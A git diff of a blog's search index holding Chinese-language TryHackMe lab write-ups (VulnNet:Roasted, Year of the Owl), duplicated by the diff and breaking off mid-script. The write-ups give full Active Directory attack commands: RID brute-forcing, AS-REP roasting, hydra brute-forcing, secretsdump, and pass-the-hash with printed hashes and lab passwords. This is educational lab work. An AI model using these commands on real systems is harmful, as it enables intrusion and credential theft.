-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.225.254 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/Hk_85jV6a.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SyMDqoNpa.png" alt="image">  </p>
-<p>找到一些user資訊，利用他們進行下一步攻擊。  </p>
-<h4 id="TGT-Attack"><a href="#TGT-Attack" class="headerlink" title="TGT Attack"></a>TGT Attack</h4><p>*所在目錄：<code>/opt/impacket/examples</code><br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GetNPUsers.py vulnnet-rst.local/ -usersfile ~/ctf/tryhackme/VulnNet-Roasted/userlist.txt -no-pass</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br>炸出<code>t-skid</code>的密碼hash。<br><img src="https://hackmd.io/_uploads/SkMfosNTT.png" alt="image"><br>利用密碼爆破工具<code>john</code>解出明文hash<br><img src="https://hackmd.io/_uploads/Skt4jj466.png" alt="image">  </p>
-<h4 id="smb-information-gathering"><a href="#smb-information-gathering" class="headerlink" title="smb information gathering"></a>smb information gathering</h4><p>經由上一步獲得使用者密碼後可以以認證後的身分進入smb<br><strong>Command</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -U VULNNET-RST\\t-skid \\\\10.10.225.254\\NETLOGON</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1UFjsEpp.png" alt="image"><br>發現可疑檔案<code>ResetPassword.vbs</code><br><strong>註：</strong><code>smb: \&gt; get ResetPassword.vbs -</code>  </p>
-<p><strong>ResetPassword.vbs</strong>  </p>
-<figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain</span><br><span class="line"><span class="keyword">Dim</span> strUserDN, objUser, strPassword, strUserNTName</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Constants for the NameTranslate object.</span></span><br><span class="line"><span class="keyword">Const</span> ADS_NAME_INITTYPE_GC = <span class="number">3</span></span><br><span class="line"><span class="keyword">Const</span> ADS_NAME_TYPE_NT4 = <span class="number">3</span></span><br><span class="line"><span class="keyword">Const</span> ADS_NAME_TYPE_1779 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (Wscript.Arguments.Count &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Syntax Error. Correct syntax is:&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;cscript ResetPassword.vbs&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">strUserNTName = <span class="string">&quot;a-whitehat&quot;</span></span><br><span class="line">strPassword = <span class="string">&quot;bNdKVkjv3RR9ht&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Determine DNS domain name from RootDSE object.</span></span><br><span class="line"><span class="keyword">Set</span> objRootDSE = <span class="built_in">GetObject</span>(<span class="string">&quot;LDAP://RootDSE&quot;</span>)</span><br><span class="line">strDNSDomain = objRootDSE.<span class="keyword">Get</span>(<span class="string">&quot;defaultNamingContext&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Use the NameTranslate object to find the NetBIOS domain name from the</span></span><br><span class="line"><span class="comment">&#x27; DNS domain name.</span></span><br><span class="line"><span class="keyword">Set</span> objTrans = <span class="built_in">CreateObject</span>(<span class="string">&quot;NameTranslate&quot;</span>)</span><br><span class="line">objTrans.Init ADS_NAME_INITTYPE_GC, <span class="string">&quot;&quot;</span></span><br><span class="line">objTrans.<span class="keyword">Set</span> ADS_NAME_TYPE_1779, strDNSDomain</span><br><span class="line">strNetBIOSDomain = objTrans.<span class="keyword">Get</span>(ADS_NAME_TYPE_NT4)</span><br><span class="line"><span class="comment">&#x27; Remove trailing backslash.</span></span><br><span class="line">strNetBIOSDomain = <span class="built_in">Left</span>(strNetBIOSDomain, <span class="built_in">Len</span>(strNetBIOSDomain) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Use the NameTranslate object to convert the NT user name to the</span></span><br><span class="line"><span class="comment">&#x27; Distinguished Name required for the LDAP provider.</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">objTrans.<span class="keyword">Set</span> ADS_NAME_TYPE_NT4, strNetBIOSDomain &amp; <span class="string">&quot;\&quot;</span> &amp; strUserNTName</span><br><span class="line"><span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;User &quot;</span> &amp; strUserNTName _</span><br><span class="line">        &amp; <span class="string">&quot; not found in Active Directory&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Program aborted&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">strUserDN = objTrans.<span class="keyword">Get</span>(ADS_NAME_TYPE_1779)</span><br><span class="line"><span class="comment">&#x27; Escape any forward slash characters, &quot;/&quot;, with the backslash</span></span><br><span class="line"><span class="comment">&#x27; escape character. All other characters that should be escaped are.</span></span><br><span class="line">strUserDN = <span class="built_in">Replace</span>(strUserDN, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;\/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Bind to the user object in Active Directory with the LDAP provider.</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> objUser = <span class="built_in">GetObject</span>(<span class="string">&quot;LDAP://&quot;</span> &amp; strUserDN)</span><br><span class="line"><span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;User &quot;</span> &amp; strUserNTName _</span><br><span class="line">        &amp; <span class="string">&quot; not found in Active Directory&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Program aborted&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">objUser.SetPassword strPassword</span><br><span class="line"><span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Password NOT reset for &quot;</span> &amp;vbCrLf &amp; strUserNTName</span><br><span class="line">    Wscript.Echo <span class="string">&quot;Password &quot;</span> &amp; strPassword &amp; <span class="string">&quot; may not be allowed, or&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;this client may not support a SSL connection.&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Program aborted&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    objUser.AccountDisabled = <span class="literal">False</span></span><br><span class="line">    objUser.Put <span class="string">&quot;pwdLastSet&quot;</span>, <span class="number">0</span></span><br><span class="line">    Err.Clear</span><br><span class="line">    objUser.SetInfo</span><br><span class="line">    <span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">        Wscript.Echo <span class="string">&quot;Password reset for &quot;</span> &amp; strUserNTName</span><br><span class="line">        Wscript.Echo <span class="string">&quot;But, unable to enable account or expire password&quot;</span></span><br><span class="line">        Wscript.Quit</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Wscript.Echo <span class="string">&quot;Password reset, account enabled,&quot;</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;and password expired for user &quot;</span> &amp; strUserNTNamegetting</span><br></pre></td></tr></table></figure>
-<p>發現使用者<code>a-whitehat</code>的密碼：<code>bNdKVkjv3RR9ht</code><br>利用已取得資訊進行下一步攻擊  </p>
-<h4 id="secretdump"><a href="#secretdump" class="headerlink" title="secretdump"></a>secretdump</h4><p>利用使用者<code>a-whitehat</code>的身分結合 impackets 中的 secretdump.py取得各使用者密碼hash<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python3 secretsdump.py -just-dc a-whitehat@vulnnet-rst.local</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/SJdP2iE6p.png" alt="image"><br>成功!!!</p>
-<h4 id="Pass-The-Hash-Attack"><a href="#Pass-The-Hash-Attack" class="headerlink" title="Pass The Hash Attack"></a>Pass The Hash Attack</h4><p>利用剛剛獲得的<code>Administrator</code>密碼hash進行 PTH 攻擊<br><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.225.254 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1Ti3sV6p.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>中間好像有跳步驟，因為<code>user.txt</code>放在使用者<code>enterprise-core-vn</code>的目錄裡，但…隨便 :D<br>累ㄌ，回去看點Crypto好了(  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>AD</tag>
-        <tag>Active Directory</tag>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Year of the Owl Write Up on TryHackMe</title>
-    <url>/2024/07/26/thm-yoto/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>有趣owob<br>Victim’s IP : 10.10.248.168<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p><em>註解：中間有部分ip會與報告前言不同，這是因為有重啟機器的緣故</em>  </p>
-<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p>以速度為考量，先使用了rustscan掃描TCP ports  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.248.168 --ulimit 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/Sk3ilE-YC.png" alt="image"></p>
-<p><img src="https://hackmd.io/_uploads/S1deZNZYC.png" alt="image"></p>
-<p>有web, samba, 無法連線的mysql, rdp以及winrm  </p>
-<p>然而，在後續的滲透中無法從前面幾種服務找到利用點，轉而利用nmap進行udp端口掃描  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top 20 10.10.248.168</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://hackmd.io/_uploads/B1hBZV-tA.png" alt="image"></p>
-<p>有snmp service  </p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="snmp-abuse-leak-username"><a href="#snmp-abuse-leak-username" class="headerlink" title="snmp abuse leak username"></a>snmp abuse leak username</h3><p>針對snmp進行利用，首先採用工具snmpwalk嘗試進行連線  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -c public 10.10.50.197</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/SyOEGNZF0.png" alt="image"><br>經過觀察，這是comunity string錯誤的緣故，利用 <a href="https://github.com/trailofbits/onesixtyone/blob/master/dict.txt">onsixtyone字典檔(link)</a>搭配hydra進行comunity string爆破  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -P snmp-string.txt snmp://10.10.248.168</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/B1Rcz4WYA.png" alt="image"><br>重新以snmpwalk工具連線後並未得到能在此階段利用的資訊，轉而利用 snmp-check 的工具進行資訊蒐集  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmp-check 10.10.248.168  -c openview -d</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HJ8BQ4bY0.png" alt="image"><br>獲得使用者名稱Jareth</p>
-<h3 id="rdp-brute-forcing"><a href="#rdp-brute-forcing" class="headerlink" title="rdp brute forcing"></a>rdp brute forcing</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l Jareth -P ~/rockyou.txt  rdp://10.10.248.168 -t 64</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HkIp7NbKC.png" alt="image"></p>
-<p>使用者無法透過rdp連線，但依然取得了密碼  </p>
-<p>Jareth&#x2F;sarah  </p>
-<p>利用 evil-winrm成功建立連線：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u Jareth -p sarah -i 10.10.248.168</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://hackmd.io/_uploads/BysgYEZKA.png" alt="image">  </p>
-<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recycle-bin-forensics"><a href="#Recycle-bin-forensics" class="headerlink" title="Recycle bin forensics"></a>Recycle bin forensics</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -Fo &#x27;C:\$Recycle.Bin&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>查看recycle bin裡的資料夾，後綴號碼為user id<br><img src="https://hackmd.io/_uploads/ry1FK4WtR.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkgcF4bKR.png" alt="image">  </p>
-<p>於使用者資料夾中取得疑似sam和system檔案的備份檔<br>利用 evil-winrm download指令進行檔案下載，於本地利用 Impackcet中的 secretsdump取得NTLM HASH<br><img src="https://hackmd.io/_uploads/r1lecNWFR.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak local</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1hf94-YA.png" alt="image"></p>
-<p>最後針對Administrator帳號施行 Pass The Hash 攻擊  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.248.168</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BJSI9VZKC.png" alt="image"><br>成功取得連線  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次翻recycle bin &#x3D;w&#x3D;<br>然後終於有正常的 snmp-check用ㄌ</p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>Windows</tag>
-        <tag>SNMP</tag>
       </tags>
   </entry>
   <entry>
@@ -3036,11 +2887,105 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <p><strong>Reference:</strong><br><a href="https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/fusion-corp">https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/fusion-corp</a></p>
 ]]></content>
       <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
         <tag>AD</tag>
         <tag>Active Directory</tag>
         <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Year of the Owl Write Up on TryHackMe</title>
+    <url>/2024/07/26/thm-yoto/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>有趣owob<br>Victim’s IP : 10.10.248.168<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p><em>註解：中間有部分ip會與報告前言不同，這是因為有重啟機器的緣故</em>  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p>以速度為考量，先使用了rustscan掃描TCP ports  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.248.168 --ulimit 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Sk3ilE-YC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1deZNZYC.png" alt="image"></p>
+<p>有web, samba, 無法連線的mysql, rdp以及winrm  </p>
+<p>然而，在後續的滲透中無法從前面幾種服務找到利用點，轉而利用nmap進行udp端口掃描  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top 20 10.10.248.168</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/B1hBZV-tA.png" alt="image"></p>
+<p>有snmp service  </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="snmp-abuse-leak-username"><a href="#snmp-abuse-leak-username" class="headerlink" title="snmp abuse leak username"></a>snmp abuse leak username</h3><p>針對snmp進行利用，首先採用工具snmpwalk嘗試進行連線  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -c public 10.10.50.197</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SyOEGNZF0.png" alt="image"><br>經過觀察，這是comunity string錯誤的緣故，利用 <a href="https://github.com/trailofbits/onesixtyone/blob/master/dict.txt">onsixtyone字典檔(link)</a>搭配hydra進行comunity string爆破  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -P snmp-string.txt snmp://10.10.248.168</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/B1Rcz4WYA.png" alt="image"><br>重新以snmpwalk工具連線後並未得到能在此階段利用的資訊，轉而利用 snmp-check 的工具進行資訊蒐集  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmp-check 10.10.248.168  -c openview -d</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJ8BQ4bY0.png" alt="image"><br>獲得使用者名稱Jareth</p>
+<h3 id="rdp-brute-forcing"><a href="#rdp-brute-forcing" class="headerlink" title="rdp brute forcing"></a>rdp brute forcing</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l Jareth -P ~/rockyou.txt  rdp://10.10.248.168 -t 64</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HkIp7NbKC.png" alt="image"></p>
+<p>使用者無法透過rdp連線，但依然取得了密碼  </p>
+<p>Jareth&#x2F;sarah  </p>
+<p>利用 evil-winrm成功建立連線：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u Jareth -p sarah -i 10.10.248.168</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/BysgYEZKA.png" alt="image">  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recycle-bin-forensics"><a href="#Recycle-bin-forensics" class="headerlink" title="Recycle bin forensics"></a>Recycle bin forensics</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -Fo &#x27;C:\$Recycle.Bin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>查看recycle bin裡的資料夾，後綴號碼為user id<br><img src="https://hackmd.io/_uploads/ry1FK4WtR.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkgcF4bKR.png" alt="image">  </p>
+<p>於使用者資料夾中取得疑似sam和system檔案的備份檔<br>利用 evil-winrm download指令進行檔案下載，於本地利用 Impackcet中的 secretsdump取得NTLM HASH<br><img src="https://hackmd.io/_uploads/r1lecNWFR.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak local</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1hf94-YA.png" alt="image"></p>
+<p>最後針對Administrator帳號施行 Pass The Hash 攻擊  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.248.168</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BJSI9VZKC.png" alt="image"><br>成功取得連線  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次翻recycle bin &#x3D;w&#x3D;<br>然後終於有正常的 snmp-check用ㄌ</p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>SNMP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnNet:Roasted on Tryhackme</title>
+    <url>/2024/03/05/vulnet-rst/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>第二次打AD，好玩ww  </p>
+<p>Victim’s IP : 10.10.225.254<br>Victim’s Host : vulnnet-rst.local<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.225.254 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/S1DuOiEa6.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/Sk99_sEa6.png" alt="image">  </p>
+<p>基本上就是一般架構，port 88有Kerberos，port 445是smb。  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.225.254 -N</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rykmYjEpp.png" alt="image">  </p>
+<p><strong>Result</strong><br>用Anonymous連進去後就是一堆奇怪(?)的文檔，基本上沒有功能。  </p>
+<p><img src="https://hackmd.io/_uploads/SkPIKsN6p.png" alt="image">  </p>
+<h4 id="smb-rid-enumeration"><a href="#smb-rid-enumeration" class="headerlink" title="smb rid enumeration"></a>smb rid enumeration</h4><p>透過<code>crackmapexec</code>進行smb rid enumeration找出Host, Group, User等相關資訊。<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.225.254 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/Hk_85jV6a.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SyMDqoNpa.png" alt="image">  </p>
+<p>找到一些user資訊，利用他們進行下一步攻擊。  </p>
+<h4 id="TGT-Attack"><a href="#TGT-Attack" class="headerlink" title="TGT Attack"></a>TGT Attack</h4><p>*所在目錄：<code>/opt/impacket/examples</code><br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 GetNPUsers.py vulnnet-rst.local/ -usersfile ~/ctf/tryhackme/VulnNet-Roasted/userlist.txt -no-pass</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br>炸出<code>t-skid</code>的密碼hash。<br><img src="https://hackmd.io/_uploads/SkMfosNTT.png" alt="image"><br>利用密碼爆破工具<code>john</code>解出明文hash<br><img src="https://hackmd.io/_uploads/Skt4jj466.png" alt="image">  </p>
+<h4 id="smb-information-gathering"><a href="#smb-information-gathering" class="headerlink" title="smb information gathering"></a>smb information gathering</h4><p>經由上一步獲得使用者密碼後可以以認證後的身分進入smb<br><strong>Command</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -U VULNNET-RST\\t-skid \\\\10.10.225.254\\NETLOGON</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1UFjsEpp.png" alt="image"><br>發現可疑檔案<code>ResetPassword.vbs</code><br><strong>註：</strong><code>smb: \&gt; get ResetPassword.vbs -</code>  </p>
+<p><strong>ResetPassword.vbs</strong>  </p>
+<figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain</span><br><span class="line"><span class="keyword">Dim</span> strUserDN, objUser, strPassword, strUserNTName</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Constants for the NameTranslate object.</span></span><br><span class="line"><span class="keyword">Const</span> ADS_NAME_INITTYPE_GC = <span class="number">3</span></span><br><span class="line"><span class="keyword">Const</span> ADS_NAME_TYPE_NT4 = <span class="number">3</span></span><br><span class="line"><span class="keyword">Const</span> ADS_NAME_TYPE_1779 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (Wscript.Arguments.Count &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Syntax Error. Correct syntax is:&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;cscript ResetPassword.vbs&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">strUserNTName = <span class="string">&quot;a-whitehat&quot;</span></span><br><span class="line">strPassword = <span class="string">&quot;bNdKVkjv3RR9ht&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Determine DNS domain name from RootDSE object.</span></span><br><span class="line"><span class="keyword">Set</span> objRootDSE = <span class="built_in">GetObject</span>(<span class="string">&quot;LDAP://RootDSE&quot;</span>)</span><br><span class="line">strDNSDomain = objRootDSE.<span class="keyword">Get</span>(<span class="string">&quot;defaultNamingContext&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Use the NameTranslate object to find the NetBIOS domain name from the</span></span><br><span class="line"><span class="comment">&#x27; DNS domain name.</span></span><br><span class="line"><span class="keyword">Set</span> objTrans = <span class="built_in">CreateObject</span>(<span class="string">&quot;NameTranslate&quot;</span>)</span><br><span class="line">objTrans.Init ADS_NAME_INITTYPE_GC, <span class="string">&quot;&quot;</span></span><br><span class="line">objTrans.<span class="keyword">Set</span> ADS_NAME_TYPE_1779, strDNSDomain</span><br><span class="line">strNetBIOSDomain = objTrans.<span class="keyword">Get</span>(ADS_NAME_TYPE_NT4)</span><br><span class="line"><span class="comment">&#x27; Remove trailing backslash.</span></span><br><span class="line">strNetBIOSDomain = <span class="built_in">Left</span>(strNetBIOSDomain, <span class="built_in">Len</span>(strNetBIOSDomain) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Use the NameTranslate object to convert the NT user name to the</span></span><br><span class="line"><span class="comment">&#x27; Distinguished Name required for the LDAP provider.</span></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">objTrans.<span class="keyword">Set</span> ADS_NAME_TYPE_NT4, strNetBIOSDomain &amp; <span class="string">&quot;\&quot;</span> &amp; strUserNTName</span><br><span class="line"><span class="keyword">If</span> (Err.Number &lt;&gt; <span class="number">0</span>) <span class="keyword">Then</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> <span class="number">0</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;User &quot;</span> &amp; strUserNTName _</span><br><span class="line">        &amp; <span class="string">&quot; not found in Active Directory&quot;</span></span><br><span class="line">    Wscript.Echo <span class="string">&quot;Program aborted&quot;</span></span><br><span class="line">    Wscript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">strUserDN = objTrans.<span class="keyword">Get</span>(ADS_NAME_TYPE_1779)</span><br><span class="line"><span class="comment">&#x27; 